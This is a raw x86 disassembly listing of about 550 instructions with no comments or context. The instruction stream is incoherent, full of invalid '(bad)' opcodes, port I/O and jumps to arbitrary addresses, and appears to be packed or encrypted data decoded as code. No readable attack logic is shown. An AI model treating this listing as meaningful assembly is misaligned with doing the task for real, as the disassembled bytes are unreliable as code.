  40f58d:	jno    0x40f584
  40f58f:	je     0x40f5d3
  40f591:	outs   dx,DWORD PTR ds:[esi]
  40f592:	dec    esp
  40f593:	jecxz  0x40f5fd
  40f595:	pushf  
  40f596:	cmp    al,0x75
  40f598:	iret   
  40f599:	xor    dh,al
  40f59b:	xor    cl,BYTE PTR [ebx+0x63255dac]
  40f5a1:	mov    ecx,0x7c999b26
  40f5a6:	or     BYTE PTR [edx],dh
  40f5a8:	mov    ecx,0x2d81fdb4
  40f5ad:	(bad)  
  40f5ae:	dec    esp
  40f5af:	(bad)  
  40f5b0:	int3   
  40f5b1:	neg    ch
  40f5b3:	xor    cl,cl
  40f5b5:	ss aas 
  40f5b7:	xchg   ecx,eax
  40f5b8:	push   0x97827e30
  40f5bd:	aas    
  40f5be:	sub    BYTE PTR [ebx-0x62],0x8
  40f5c2:	je     0x40f55c
  40f5c4:	push   0x75
  40f5c6:	sub    cl,BYTE PTR [esi+0x4e]
  40f5c9:	mov    bh,0x1f
  40f5cb:	dec    eax
  40f5cc:	or     edx,eax
  40f5ce:	mov    ebp,0x2eda7c9d
  40f5d3:	div    ch
  40f5d5:	sub    eax,0x10e0007a
  40f5da:	enter  0xc99d,0xd5
  40f5de:	mov    ebx,0x7b3d8c83
  40f5e3:	or     ch,BYTE PTR [ebp-0x41f96bc9]
  40f5e9:	test   al,0x59
  40f5eb:	stc    
  40f5ec:	addr16 dec edx
  40f5ee:	inc    esp
  40f5ef:	inc    ebx
  40f5f0:	xchg   ebp,eax
  40f5f1:	fcomp  DWORD PTR [edx+0x2d]
  40f5f4:	test   cl,dl
  40f5f6:	dec    eax
  40f5f7:	xchg   ecx,eax
  40f5f8:	mov    cl,BYTE PTR [ebx+esi*4]
  40f5fb:	inc    ebp
  40f5fc:	ins    DWORD PTR es:[edi],dx
  40f5fd:	mov    ah,bh
  40f5ff:	shl    DWORD PTR [esi-0x3],1
  40f602:	jecxz  0x40f617
  40f604:	mov    WORD PTR [edi-0x67],es
  40f607:	xlat   BYTE PTR ds:[ebx]
  40f608:	add    cl,BYTE PTR [ebx-0x15]
  40f60b:	push   esi
  40f60c:	xchg   eax,esi
  40f60e:	or     ah,0xd8
  40f611:	xchg   ebx,eax
  40f612:	shr    BYTE PTR gs:[eax-0x76],cl
  40f616:	in     al,0x8a
  40f618:	popa   
  40f619:	add    ebx,ebp
  40f61b:	js     0x40f638
  40f61d:	fbstp  TBYTE PTR [ebx-0x41f91710]
  40f623:	test   ch,0x17
  40f626:	inc    ebp
  40f627:	xchg   DWORD PTR [ebx],ebx
  40f629:	xchg   ecx,eax
  40f62a:	sub    al,0x38
  40f62c:	in     eax,0xa0
  40f62e:	xor    DWORD PTR [ebp+0x7168f99e],esi
  40f634:	aad    0x80
  40f636:	pop    ds
  40f637:	cmp    DWORD PTR [edx-0x3c],ebp
  40f63a:	mov    WORD PTR [edi],?
  40f63c:	xchg   esi,eax
  40f63d:	xchg   DWORD PTR [esi-0x7a],edx
  40f640:	stc    
  40f641:	rcl    BYTE PTR [ecx-0x2849306],cl
  40f647:	loope  0x40f6c1
  40f649:	popf   
  40f64a:	clc    
  40f64b:	(bad)  
  40f64c:	or     edx,edi
  40f64e:	icebp  
  40f64f:	call   0xfc18:0x2c85ffe2
  40f656:	outs   dx,DWORD PTR ds:[esi]
  40f657:	jb     0x40f633
  40f659:	(bad)  
  40f65a:	sti    
  40f65b:	dec    edx
  40f65c:	dec    edx
  40f65d:	in     eax,0x4a
  40f65f:	shl    DWORD PTR [esi-0x3c9bf9fb],0x76
  40f666:	dec    ebx
  40f667:	sub    bl,0xad
  40f66a:	jge    0x40f6d9
  40f66c:	ds jno 0x40f6c1
  40f66f:	sbb    al,0xac
  40f671:	mov    esp,0x19081ada
  40f676:	stc    
  40f677:	dec    esp
  40f678:	or     DWORD PTR [ecx],esi
  40f67a:	mov    cl,0x20
  40f67c:	out    dx,eax
  40f67d:	jg     0x40f61f
  40f67f:	lea    edi,[eax+0x395e81f3]
  40f685:	lods   al,BYTE PTR ds:[esi]
  40f686:	dec    edi
  40f687:	data16 fdivr st,st(6)
  40f68a:	and    edi,DWORD PTR [esi+0x138be5a9]
  40f690:	cmp    al,0xfe
  40f692:	fsub   QWORD PTR [eax-0x1a]
  40f695:	loop   0x40f64c
  40f697:	fwait
  40f698:	aam    0xdf
  40f69a:	jl     0x40f62e
  40f69c:	sahf   
  40f69d:	sbb    DWORD PTR [ebx+0x3a],ecx
  40f6a0:	int3   
  40f6a1:	sbb    al,0x10
  40f6a3:	pushf  
  40f6a4:	dec    esp
  40f6a5:	jns    0x40f67a
  40f6a7:	inc    edi
  40f6a8:	xchg   edi,eax
  40f6a9:	(bad)  
  40f6aa:	out    dx,al
  40f6ab:	(bad)  
  40f6ac:	call   0x5e156af
  40f6b1:	adc    esp,edx
  40f6b3:	imul   esp,DWORD PTR [eax+0x26],0xc
  40f6b7:	inc    ebp
  40f6b8:	in     eax,0xb4
  40f6ba:	pop    esi
  40f6bb:	mov    BYTE PTR [ebx-0x1c4a6c7c],dl
  40f6c1:	jle    0x40f692
  40f6c3:	sub    bh,BYTE PTR [eax+0x7f99f85]
  40f6c9:	and    BYTE PTR [esi],0x81
  40f6cc:	out    0xc6,al
  40f6ce:	in     eax,dx
  40f6cf:	sub    DWORD PTR [edx-0x570ca8d7],esp
  40f6d5:	push   cs
  40f6d6:	jns    0x40f6a9
  40f6d8:	mov    al,0xa1
  40f6da:	mov    bl,ch
  40f6dc:	pushf  
  40f6dd:	mov    DWORD PTR [ebp-0x787facd7],ebp
  40f6e3:	mov    bl,0x9b
  40f6e5:	pusha  
  40f6e6:	ret    0x8ac
  40f6e9:	mov    eax,ds:0xf5a88385
  40f6ee:	ins    BYTE PTR es:[edi],dx
  40f6ef:	push   0x5b57e949
  40f6f4:	cwde   
  40f6f5:	fnstsw WORD PTR [edi+0x4b19e1fa]
  40f6fb:	mov    eax,ds:0x971d8dc7
  40f700:	pop    ss
  40f701:	dec    esi
  40f702:	and    ah,0x16
  40f705:	ins    BYTE PTR es:[edi],dx
  40f706:	mov    dl,0x72
  40f708:	dec    ebp
  40f709:	ins    BYTE PTR es:[edi],dx
  40f70a:	lea    eax,[edx+0x3f]
  40f70d:	test   BYTE PTR ds:0x9459daed,al
  40f713:	xchg   BYTE PTR [ebx],ch
  40f715:	jnp    0x40f794
  40f717:	cli    
  40f718:	addr16 test eax,0x9a676b3d
  40f71e:	push   cs
  40f71f:	test   al,0x97
  40f721:	int    0x9e
  40f723:	and    edx,esi
  40f725:	pop    es
  40f726:	cmp    eax,0x1436df61
  40f72b:	cmovg  eax,DWORD PTR [ecx-0xf6d5dc2]
  40f732:	(bad)  
  40f733:	lahf   
  40f734:	inc    esp
  40f735:	mov    dl,0xb0
  40f737:	pop    edx
  40f738:	add    ch,BYTE PTR ds:0x41be7be
  40f73e:	outs   dx,BYTE PTR ds:[esi]
  40f73f:	pop    edx
  40f740:	aam    0x48
  40f742:	mov    ebp,0x34ffc7f2
  40f747:	cwde   
  40f748:	in     eax,dx
  40f749:	cld    
  40f74a:	sub    ch,BYTE PTR [ebx+0x13]
  40f74d:	stc    
  40f74e:	ins    BYTE PTR es:[edi],dx
  40f74f:	adc    BYTE PTR [edi+0x78],dl
  40f752:	dec    edx
  40f753:	xchg   edi,eax
  40f754:	pusha  
  40f755:	mov    bl,0xea
  40f757:	mov    esp,0xe43328bf
  40f75c:	or     eax,0xedea05e5
  40f761:	cmp    BYTE PTR [esi],ch
  40f763:	repnz mov al,0x55
  40f766:	adc    ebp,DWORD PTR [edi+ebx*1-0x383fb9cf]
  40f76d:	mov    esp,0x5a32006d
  40f772:	ja     0x40f78e
  40f774:	in     al,0xe2
  40f776:	sub    BYTE PTR [edx],ah
  40f778:	hlt    
  40f779:	aas    
  40f77a:	ins    DWORD PTR es:[edi],dx
  40f77b:	test   eax,0xc579ef00
  40f780:	add    BYTE PTR [ebx-0x6f],ch
  40f783:	inc    eax
  40f784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f785:	outs   dx,BYTE PTR ds:[esi]
  40f786:	xor    cl,ah
  40f788:	pop    ds
  40f789:	or     DWORD PTR [ebx-0x5b656379],esp
  40f78f:	or     DWORD PTR [edx-0x44],ecx
  40f792:	in     al,0xfb
  40f794:	mov    cl,0x20
  40f796:	adc    al,BYTE PTR [ecx+0x7e]
  40f799:	sahf   
  40f79a:	fld    DWORD PTR [ebx]
  40f79c:	push   ecx
  40f79d:	in     al,0xa0
  40f79f:	icebp  
  40f7a0:	xchg   edi,eax
  40f7a1:	gs enter 0x7c9c,0x49
  40f7a6:	sbb    eax,DWORD PTR [eax]
  40f7a8:	dec    esi
  40f7a9:	(bad)  
  40f7ab:	inc    ecx
  40f7ac:	or     bh,BYTE PTR [esi]
  40f7ae:	dec    edi
  40f7af:	xchg   edi,eax
  40f7b0:	shl    BYTE PTR [ebp+0x7f],1
  40f7b3:	test   DWORD PTR [esp+eiz*8+0x5083ee9d],eax
  40f7ba:	lea    eax,gs:[eax]
  40f7bd:	test   al,0xc8
  40f7bf:	int3   
  40f7c0:	xlat   BYTE PTR ds:[ebx]
  40f7c1:	xchg   esi,eax
  40f7c2:	ds in  eax,0x11
  40f7c5:	dec    ebx
  40f7c6:	in     al,0x78
  40f7c8:	jge    0x40f797
  40f7ca:	jnp    0x40f807
  40f7cc:	sar    BYTE PTR [esp+edx*4+0x59],0xdd
  40f7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d2:	jmp    0x47071da8
  40f7d7:	sub    ch,BYTE PTR [eax+0xe7ca228]
  40f7dd:	pop    ds
  40f7de:	sub    BYTE PTR [ebx],dl
  40f7e0:	pop    ebx
  40f7e1:	std    
  40f7e2:	or     eax,0xcf61fe76
  40f7e8:	inc    ecx
  40f7e9:	or     al,0x30
  40f7eb:	dec    ecx
  40f7ec:	test   eax,0x940db52d
  40f7f1:	pop    edx
  40f7f2:	mov    dh,0xa8
  40f7f4:	xor    BYTE PTR [ebp+0x2c1aa850],0xef
  40f7fb:	pop    ss
  40f7fc:	ja     0x40f7c7
  40f7fe:	into   
  40f7ff:	sub    DWORD PTR [esi+ecx*1-0x5e],ebp
  40f803:	inc    ecx
  40f804:	aad    0xf5
  40f806:	sbb    BYTE PTR [eax],ah
  40f808:	scas   eax,DWORD PTR es:[edi]
  40f809:	mov    cl,cl
  40f80b:	xor    dl,cl
  40f80d:	imul   ecx,DWORD PTR [edi],0xffffffec
  40f810:	pop    eax
  40f811:	mov    esi,0x480387e3
  40f816:	retf   
  40f817:	push   eax
  40f818:	jg     0x40f82d
  40f81a:	rol    BYTE PTR [edx-0x4c],1
  40f81d:	clc    
  40f81e:	or     edi,DWORD PTR [esi]
  40f820:	push   ss
  40f821:	mov    ecx,0x1e739aa0
  40f826:	outs   dx,DWORD PTR ds:[esi]
  40f827:	or     al,0x2c
  40f829:	mov    ebp,0x5e08015e
  40f82e:	fmul   DWORD PTR [eax-0x12beeb]
  40f834:	(bad)  
  40f835:	js     0x40f7bd
  40f837:	sar    BYTE PTR [edx-0x5cc7e7c0],1
  40f83d:	stos   DWORD PTR es:[edi],eax
  40f83e:	jb     0x40f882
  40f840:	xor    BYTE PTR [ebx+0x613f2fee],bh
  40f846:	xchg   edx,eax
  40f847:	ret    
  40f848:	fcomp  DWORD PTR [ebx+0x1f5d9394]
  40f84e:	add    ebx,DWORD PTR [eiz*8+0x213f0170]
  40f855:	test   BYTE PTR [ebp+0x625ad305],dh
  40f85b:	or     eax,0x44b00637
  40f860:	add    DWORD PTR [eax+0x13fa996e],0x5afa3189
  40f86a:	lods   eax,DWORD PTR ds:[esi]
  40f86b:	mov    DWORD PTR [eax+ecx*4+0x49639eba],0xcf92666c
  40f876:	adc    al,0xee
  40f878:	pop    eax
  40f879:	jl     0x40f808
  40f87b:	add    ah,BYTE PTR ds:0x56569d42
  40f881:	loopne 0x40f828
  40f883:	sbb    ecx,DWORD PTR [eax]
  40f885:	je     0x40f830
  40f887:	in     al,dx
  40f888:	rcl    bh,0xe5
  40f88b:	dec    ebp
  40f88c:	inc    edi
  40f88d:	jle    0x40f833
  40f88f:	(bad)  
  40f890:	out    dx,al
  40f891:	push   esi
  40f892:	jne    0x40f90f
  40f894:	cli    
  40f895:	ins    BYTE PTR es:[edi],dx
  40f896:	sub    al,0x1e
  40f898:	das    
  40f899:	xor    al,0x6f
  40f89b:	xchg   BYTE PTR [edx],dh
  40f89d:	mov    ecx,0x3ee8cf95
  40f8a2:	jno    0x40f8ef
  40f8a4:	enter  0xf14a,0x5b
  40f8a8:	lock sbb edi,DWORD PTR [esp+edi*1+0x4e]
  40f8ad:	and    al,0x55
  40f8af:	shl    edi,1
  40f8b1:	retf   
  40f8b2:	cmp    al,0xb9
  40f8b4:	cld    
  40f8b5:	loop   0x40f8f3
  40f8b7:	dec    esi
  40f8b8:	scas   al,BYTE PTR es:[edi]
  40f8b9:	xchg   ecx,eax
  40f8ba:	and    ecx,DWORD PTR [edi+0x8]
  40f8bd:	jo     0x40f921
  40f8bf:	xor    dh,dl
  40f8c1:	jl     0x40f8a4
  40f8c3:	and    al,ch
  40f8c5:	cmp    ecx,esi
  40f8c7:	icebp  
  40f8c8:	jae    0x40f8c1
  40f8ca:	arpl   cx,bp
  40f8cc:	adc    ecx,DWORD PTR [ecx-0x333de360]
  40f8d2:	sbb    dl,BYTE PTR [ecx+0x11d19e0b]
  40f8d8:	push   ds
  40f8d9:	popfw  
  40f8db:	pop    ebp
  40f8dc:	mov    ebx,0x575757dc
  40f8e1:	mov    al,0xc9
  40f8e3:	sar    BYTE PTR [eax+ecx*8-0x5c],cl
  40f8e7:	pushf  
  40f8e8:	sbb    cl,BYTE PTR [edi+eax*2]
  40f8eb:	imul   eax,DWORD PTR [ebx+0x1],0x3c
  40f8ef:	inc    ebx
  40f8f0:	icebp  
  40f8f1:	mov    al,0xb1
  40f8f3:	scas   al,BYTE PTR es:[edi]
  40f8f4:	add    al,0x16
  40f8f6:	sub    edi,DWORD PTR [ebp-0x56fd2e3e]
  40f8fc:	imul   edi,DWORD PTR [ebx-0x75],0xffffffbb
  40f900:	jb     0x40f8ce
  40f902:	pop    ss
  40f903:	mov    ds:0xe92424d5,al
  40f908:	mov    esp,DWORD PTR [esi]
  40f90a:	popf   
  40f90b:	int    0xae
  40f90d:	(bad)  
  40f90e:	mov    eax,0x8de57e3f
  40f913:	cli    
  40f914:	add    BYTE PTR [edi],bh
  40f916:	add    cl,bl
  40f918:	shl    DWORD PTR [esi+0x76],cl
  40f91b:	out    0x4b,eax
  40f91d:	cdq    
  40f91e:	int3   
  40f91f:	stos   DWORD PTR es:[edi],eax
  40f920:	dec    ebx
  40f921:	add    dh,0x55
  40f924:	scas   al,BYTE PTR es:[edi]
  40f925:	arpl   WORD PTR ds:0xd4f7f43f,cx
  40f92b:	sti    
  40f92c:	xchg   eax,ebp
  40f92e:	mov    dl,0x1a
  40f930:	into   
  40f931:	jnp    0x40f94a
  40f933:	pushf  
  40f934:	or     cl,0x6b
  40f937:	sub    al,0x1
  40f939:	adc    eax,0x4ea9d19f
  40f93e:	mov    al,0x12
  40f940:	jo     0x40f95e
  40f942:	lods   al,BYTE PTR ds:[esi]
  40f943:	sbb    eax,0xb3e32fad
  40f948:	sahf   
  40f949:	ins    BYTE PTR es:[edi],dx
  40f94a:	mov    al,ds:0xe95ba11b
  40f94f:	dec    edx
  40f950:	push   0xd60642e0
  40f955:	sbb    ch,dh
  40f957:	js     0x40f9c8
  40f959:	rcl    DWORD PTR [eax+ecx*1],0x1a
  40f95d:	pop    ebx
  40f95e:	push   0x584ae002
  40f963:	push   edi
  40f964:	push   edx
  40f965:	jnp    0x40f9e6
  40f967:	outs   dx,DWORD PTR ds:[esi]
  40f968:	sub    eax,0x93cb47a8
  40f96d:	and    edi,edi
  40f96f:	fst    QWORD PTR [ebp-0x2bb8611c]
  40f975:	adc    eax,0xb67d264e
  40f97a:	sub    eax,0xe0cac8e
  40f97f:	imul   esp,DWORD PTR [ebp+0x726b3e10],0x50fcd730
  40f989:	dec    ecx
  40f98a:	mov    al,ds:0xdbdda36e
  40f98f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f990:	clc    
  40f991:	daa    
  40f992:	repz push ss
  40f994:	sahf   
  40f995:	mov    bl,0x46
  40f997:	xchg   edx,eax
  40f998:	push   ebx
  40f999:	mov    ch,0x7f
  40f99b:	loopne 0x40f9e7
  40f99d:	mov    ds:0x579db3c5,eax
  40f9a2:	(bad)  
  40f9a3:	jl     0x40f94d
  40f9a5:	(bad)  
  40f9a6:	mov    dh,0x2c
  40f9a8:	in     eax,0x29
  40f9aa:	push   cs
  40f9ab:	jmp    0x40f979
  40f9ad:	ja     0x40f995
  40f9af:	repnz push ecx
  40f9b1:	fisub  WORD PTR [edi+ebp*2]
  40f9b4:	dec    edx
  40f9b5:	pop    ebx
  40f9b6:	add    edi,DWORD PTR [ebx+eax*2]
  40f9b9:	xor    eax,0x2e4194b8
  40f9be:	sub    cx,WORD PTR ds:0x4c61dc16
  40f9c5:	outs   dx,BYTE PTR ds:[esi]
  40f9c6:	mov    ds:0x7ce73df9,al
  40f9cb:	push   0x535a7dbe
  40f9d0:	pop    ecx
  40f9d1:	scas   eax,DWORD PTR es:[edi]
  40f9d2:	int3   
  40f9d3:	scas   eax,DWORD PTR es:[edi]
  40f9d4:	mov    cl,0x20
  40f9d6:	je     0x40f95b
  40f9d8:	enter  0x3080,0x71
  40f9dc:	xchg   ebx,eax
  40f9dd:	loop   0x40fa51
  40f9df:	arpl   di,ax
  40f9e1:	das    
  40f9e2:	pop    ecx
  40f9e3:	adc    al,BYTE PTR [eax]
  40f9e5:	das    
  40f9e6:	imul   eax,DWORD PTR [eax-0x615a6a51],0x7d958832
  40f9f0:	shr    al,0x92
  40f9f3:	sbb    ah,dh
  40f9f5:	sub    al,0x5a
  40f9f7:	push   edx
  40f9f8:	cs cmc 
  40f9fa:	mov    cl,0xf7
  40f9fc:	xchg   ecx,eax
  40f9fd:	inc    ecx
  40f9fe:	sar    BYTE PTR [edi],0xe4
  40fa01:	xchg   esi,edx
  40fa03:	add    al,0x1b
  40fa05:	test   dh,0x94
  40fa08:	rol    BYTE PTR [ebp+0x25ac382c],0xee
  40fa0f:	add    eax,0xe2a6f7a
  40fa14:	mov    ch,0x41
  40fa16:	inc    edi
  40fa17:	xchg   esi,eax
  40fa18:	lods   eax,DWORD PTR ds:[esi]
  40fa19:	retf   
  40fa1a:	cs cmp al,0x79
  40fa1d:	mov    BYTE PTR [ecx+ebp*4-0x68f78032],al
  40fa24:	jmp    0x505a1705
  40fa29:	pop    ss
  40fa2a:	jne    0x40fa60
  40fa2c:	clc    
  40fa2d:	mov    edx,0x8758fa9
  40fa32:	icebp  
  40fa33:	gs popf 
  40fa35:	dec    ecx
  40fa36:	ds sbb eax,0x1d20cb80
  40fa3c:	gs push 0xf10d5cb7
  40fa42:	(bad)  
  40fa43:	sbb    al,0x48
  40fa45:	out    dx,eax
  40fa46:	and    BYTE PTR [edi],cl
  40fa48:	inc    eax
  40fa49:	test   DWORD PTR [ebx],ecx
  40fa4b:	dec    edx
  40fa4c:	mov    bh,0x78
  40fa4e:	in     al,dx
  40fa4f:	sar    BYTE PTR [esi],1
  40fa51:	stos   DWORD PTR es:[edi],eax
  40fa52:	or     esi,0x26
  40fa55:	shl    DWORD PTR [edx],1
  40fa57:	jae    0x40fa3e
  40fa59:	adc    eax,0x4823f527
  40fa5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa5f:	add    ebp,DWORD PTR [edx+eax*1-0x6863607c]
  40fa66:	mov    al,0xe
  40fa68:	cs push edx
  40fa6a:	jmp    0xeb158b13
  40fa6f:	scas   al,BYTE PTR es:[edi]
  40fa70:	mov    ebp,0x844432b
  40fa75:	mov    dh,0x7c
  40fa77:	mov    al,ds:0x33eeefd1
  40fa7c:	mov    ds:0x8af83623,al
  40fa81:	mov    eax,0x1c733bc2
  40fa86:	rol    BYTE PTR ss:[esi+edx*8+0x3f3488f3],cl
  40fa8e:	into   
  40fa8f:	mov    ebx,0x177247e3
  40fa94:	sbb    al,0x86
  40fa96:	dec    esp
  40fa97:	(bad)  
  40fa98:	test   ah,cl
  40fa9a:	sub    esp,edx
  40fa9c:	fadd   QWORD PTR [ecx+0x771301cd]
  40faa2:	cmp    DWORD PTR [edx-0x6c],eax
  40faa5:	call   0xbcd5:0x4e0fab22
  40faac:	leave  
  40faad:	jns    0x40fac9
  40faaf:	outs   dx,BYTE PTR ds:[esi]
  40fab0:	hlt    
  40fab1:	jge    0x40fae0
  40fab3:	es push ds
  40fab5:	xchg   edi,eax
  40fab6:	jge    0x40fa3b
  40fab8:	fistp  WORD PTR [edx+0x3f]
  40fabb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fabc:	out    0x6d,eax
  40fabe:	out    dx,al
  40fabf:	loopne 0x40fa5f
  40fac1:	inc    esi
  40fac2:	retf   0x5875
  40fac5:	ins    DWORD PTR es:[edi],dx
  40fac6:	loop   0x40faca
  40fac8:	ja     0x40fa72
  40faca:	retf   0x2c50
  40facd:	popa   
  40face:	sub    esp,DWORD PTR [edx-0x29]
  40fad1:	mov    ds:0xe1df1f40,eax
  40fad6:	lahf   
  40fad7:	dec    ebp
  40fad8:	mov    dl,0x14
  40fada:	ins    BYTE PTR es:[edi],dx
  40fadb:	outs   dx,BYTE PTR ds:[esi]
  40fadc:	jmp    0xe29a:0x5e884f49
  40fae3:	or     bh,ch
  40fae5:	fcmovne st,st(1)
  40fae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fae8:	adc    ah,BYTE PTR [eax]
  40faea:	fiadd  DWORD PTR [edx+0x4d]
  40faed:	or     eax,DWORD PTR [edx]
  40faef:	arpl   WORD PTR [edx-0x67],sp
  40faf2:	fst    QWORD PTR [eax-0x2337fe14]
  40faf8:	mov    ds:0xa8d71149,al
  40fafd:	mov    esi,DWORD PTR [ecx-0x3b3d6f43]
  40fb03:	sbb    ebp,DWORD PTR [ebx-0x4255d5b6]
  40fb09:	sub    DWORD PTR [ecx+esi*2+0x5a86ed3b],edx
  40fb10:	sub    eax,0x504ece93
  40fb15:	in     eax,dx
  40fb16:	(bad)  
  40fb18:	or     BYTE PTR [eax+0x4b0ca92b],bl
  40fb1e:	pop    es
  40fb1f:	xchg   ebx,eax
  40fb20:	enter  0xc529,0xc5
  40fb24:	add    eax,0x3cebc623
  40fb29:	hlt    
  40fb2a:	fs rol ah,cl
  40fb2d:	pop    ebx
  40fb2e:	mov    dh,0xca
  40fb30:	adc    DWORD PTR [edi],0x2c40234c
  40fb36:	jecxz  0x40fb98
  40fb38:	push   esp
  40fb39:	push   ebp
  40fb3a:	push   ds
  40fb3b:	test   al,0xd2
  40fb3d:	adc    eax,0x275956fe
  40fb42:	add    eax,0x4aefd295
  40fb47:	mov    edi,0x965ca8de
  40fb4c:	cwde   
  40fb4d:	add    BYTE PTR [ebx],0x20
  40fb50:	sbb    DWORD PTR ds:0xf5b79df0,ecx
  40fb56:	out    dx,al
  40fb57:	pop    esp
  40fb58:	aas    
  40fb59:	push   cs
  40fb5a:	jns    0x40fbd1
  40fb5c:	cli    
  40fb5d:	and    ebx,DWORD PTR [ecx+0x3]
  40fb60:	std    
  40fb61:	rcr    BYTE PTR [edx+0x6f36f873],1
  40fb67:	out    0x55,eax
  40fb69:	and    ebx,DWORD PTR ds:0x207d1843
  40fb6f:	sbb    al,0x59
  40fb71:	cmp    BYTE PTR [ebx],cl
  40fb73:	mov    ch,ah
  40fb75:	xchg   ecx,eax
  40fb76:	and    eax,0x1075caad
  40fb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb7c:	cli    
  40fb7d:	pop    es
  40fb7e:	push   esi
  40fb7f:	popa   
  40fb80:	or     BYTE PTR [ebx-0x15],dh
  40fb83:	idiv   DWORD PTR [ebx]
  40fb85:	or     DWORD PTR [esi+esi*4],eax
  40fb88:	and    bh,bh
  40fb8a:	out    0xd0,eax
  40fb8c:	retf   
  40fb8d:	loope  0x40fb0f
  40fb8f:	xchg   edi,eax
  40fb90:	aaa    
  40fb91:	push   ss
  40fb92:	xlat   BYTE PTR ds:[ebx]
  40fb93:	cs dec edi
  40fb95:	push   0x4c443e1f
  40fb9a:	jae    0x40fb2a
  40fb9c:	test   al,0x9
  40fb9e:	test   eax,0xa385783e
  40fba3:	mov    ebp,0xe701befa
  40fba8:	adc    ecx,DWORD PTR [eax+0x31]
  40fbab:	mov    eax,0xf28704d5
  40fbb0:	dec    eax
  40fbb1:	xchg   edx,eax
  40fbb2:	jmp    0x40fb6b
  40fbb4:	bound  edi,QWORD PTR [esi]
  40fbb6:	lods   eax,DWORD PTR ds:[esi]
  40fbb7:	cmp    DWORD PTR [edx-0x2ed02051],eax
  40fbbd:	mov    al,0x3a
  40fbbf:	call   0xd46e1dca
  40fbc4:	cmp    bl,BYTE PTR [esi+0x10832382]
  40fbca:	lock push eax
  40fbcc:	jb     0x40fb5a
  40fbce:	push   es
  40fbcf:	jecxz  0x40fc24
  40fbd1:	retf   
  40fbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd3:	add    DWORD PTR [eax],edi
  40fbd5:	mov    BYTE PTR [esi-0x31],al
  40fbd8:	xor    ah,BYTE PTR [edx+0x31]
  40fbdb:	push   es
  40fbdc:	test   ecx,esp
  40fbde:	xchg   ebp,eax
  40fbdf:	ins    DWORD PTR es:[edi],dx
  40fbe0:	out    0x9d,al
  40fbe2:	push   ecx
  40fbe3:	es pop ecx
  40fbe5:	jge    0x40fbeb
  40fbe7:	cmc    
  40fbe8:	addr16 pop ss
  40fbea:	xchg   edx,eax
  40fbeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbec:	ins    BYTE PTR es:[edi],dx
  40fbed:	add    BYTE PTR [edi+0x17],dl
  40fbf0:	lock stc 
  40fbf2:	push   edx
  40fbf3:	mov    dh,0xfc
  40fbf5:	mov    al,ds:0x313bdd10
  40fbfa:	iret   
  40fbfb:	sbb    esi,DWORD PTR [ebx-0x24]
  40fbfe:	mov    DWORD PTR [edi],ecx
  40fc00:	pop    esp
  40fc01:	cmc    
  40fc02:	rcl    ah,0xb8
  40fc05:	mov    esi,0xa9e5adfb
  40fc0a:	imul   BYTE PTR [eax]
  40fc0c:	cmp    DWORD PTR [ebp*1+0x2f38bdc8],ecx
  40fc13:	fcom   DWORD PTR [esi]
  40fc15:	inc    ebp
  40fc16:	mov    edi,0x708dbd3d
  40fc1b:	mov    edx,0x9f7358a0
  40fc20:	mov    eax,0xc9b50761
  40fc25:	fcmovbe st,st(7)
  40fc27:	gs sub eax,0x6ec03da6
  40fc2d:	std    
  40fc2e:	ins    DWORD PTR es:[edi],dx
  40fc2f:	pop    ebp
  40fc30:	mov    al,0x7a
  40fc32:	leave  
  40fc33:	jne    0x40fc7d
  40fc35:	mov    ch,0x6d
  40fc37:	sbb    al,0x1e
  40fc39:	dec    edi
  40fc3a:	xchg   ecx,eax
  40fc3b:	mov    edi,0xe564c84b
  40fc40:	scas   eax,DWORD PTR es:[edi]
  40fc41:	add    cl,BYTE PTR [ecx+0x18]
  40fc44:	sbb    BYTE PTR [eax-0x51],cl
  40fc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc48:	sbb    ch,bh
  40fc4a:	push   ss
  40fc4b:	icebp  
  40fc4c:	cmp    esp,DWORD PTR [esp+eax*4]
  40fc4f:	shl    edx,1
  40fc51:	js     0x40fbd9
  40fc53:	out    dx,al
  40fc54:	aad    0x56
  40fc56:	rcl    BYTE PTR [esi-0x5f4b80ef],0x7e
  40fc5d:	aaa    
  40fc5e:	cmp    eax,DWORD PTR [ecx]
  40fc60:	add    ebx,0x8d6b69a4
  40fc66:	push   ss
  40fc67:	ss in  al,0x1c
  40fc6a:	ja     0x40fcb6
  40fc6c:	cli    
  40fc6d:	leave  
  40fc6e:	pop    es
  40fc6f:	out    dx,eax
  40fc70:	jmp    0xc388a0c7
  40fc75:	sub    eax,0xd8abe47a
  40fc7a:	(bad)  [edi+0x3b2315fb]
  40fc80:	leave  
  40fc81:	inc    esp
  40fc82:	nop
  40fc83:	add    eax,0x7abfc592
  40fc88:	push   0x934ba71
  40fc8d:	mov    al,dh
  40fc8f:	test   eax,0xb28e515a
  40fc94:	cdq    
  40fc95:	adc    al,0x1b
  40fc97:	mov    ds:0xdb2d00c4,eax
  40fc9c:	jo     0x40fc7a
  40fc9e:	arpl   WORD PTR [ecx],cx
  40fca0:	pop    edx
  40fca1:	ret    0xe0f9
  40fca4:	inc    esp
  40fca5:	clc    
  40fca6:	loope  0x40fc76
  40fca8:	and    ebp,DWORD PTR [esi+ebx*4]
  40fcab:	ja     0x40fc50
  40fcad:	mov    eax,0x7613c811
  40fcb2:	mov    DWORD PTR [eax-0x6e37b83d],edx
  40fcb8:	cmp    esi,DWORD PTR ds:0x93798db3
  40fcbe:	pop    esi
  40fcbf:	add    eax,0xf31f2f7
  40fcc4:	push   esp
  40fcc5:	repnz xchg esp,eax
  40fcc7:	and    dl,BYTE PTR [ebx+ebx*1]
  40fcca:	pop    edi
  40fccb:	bound  eax,QWORD PTR [edx]
  40fccd:	xor    al,0x15
  40fccf:	mov    al,ds:0x414f242c
  40fcd4:	sub    edi,0x835d2a14
  40fcda:	nop
  40fcdb:	pop    ebp
  40fcdc:	jmp    0x40fcbf
  40fcde:	mov    al,ds:0xf73f76ba
  40fce3:	push   ebp
  40fce4:	cdq    
  40fce5:	scas   al,BYTE PTR es:[edi]
